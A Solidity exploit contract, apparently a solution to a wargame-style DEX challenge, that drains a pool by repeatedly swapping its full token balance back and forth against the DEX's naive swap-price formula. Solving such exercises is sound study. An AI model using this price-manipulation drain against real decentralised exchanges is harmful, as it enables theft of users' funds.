// SPDX-License-Identifier: MIT
import "../../src/DEX/DEX.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/utils/math/Math.sol";

pragma solidity ^0.8.0;

contract DEXExploit {

    DEX public victim;

    constructor(address payable _victim){
        victim = DEX(_victim);
    }

    function hack() public {
        address token1 = victim.token1();
        address token2 = victim.token2();

        // Approve the DEX to spend our tokens
        IERC20(token1).approve(address(victim), type(uint256).max);
        IERC20(token2).approve(address(victim), type(uint256).max);

        uint iterations = 0;
        while ((IERC20(token1).balanceOf(address(victim)) > 0 && IERC20(token2).balanceOf(address(victim)) > 0) && iterations < 100) {
            uint amount;
            address from;
            address to;

            if (IERC20(token1).balanceOf(address(this)) > 0) {
                from = token1;
                to = token2;
                amount = IERC20(token1).balanceOf(address(this));
            } else {
                from = token2;
                to = token1;
                amount = IERC20(token2).balanceOf(address(this));
            }

            uint dexBalanceTo = IERC20(to).balanceOf(address(victim));
            uint swapAmount = victim.getSwapPrice(from, to, amount);

            if (swapAmount > dexBalanceTo) {
                amount = amount * dexBalanceTo / swapAmount;
                swapAmount = victim.getSwapPrice(from, to, amount);
            }

            victim.swap(from, to, amount);
            iterations++;
        }
    }

    receive() external payable {
    }
}